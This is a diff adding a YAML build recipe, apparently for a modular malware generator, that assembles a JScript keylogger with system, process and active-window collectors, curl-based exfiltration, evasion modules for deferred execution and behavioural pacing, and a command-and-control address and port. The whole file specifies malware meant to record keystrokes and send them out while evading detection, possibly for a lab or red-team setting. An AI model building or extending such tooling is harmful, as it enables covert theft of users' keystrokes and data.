@@ -1,0 +1,27 @@
+name: js_keylogger_curl
+description: JScript keylogger with curl LOLBin exfiltration
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/processes
+  - collectors/active_windows
+
+keylogger: collectors/keylogger_staged
+
+exfil: exfil/curl_lolbin
+arch: arch/keylogger
+
+evasion:
+  - evasion/deferred_exec
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  KEYLOG_DURATION: "30"
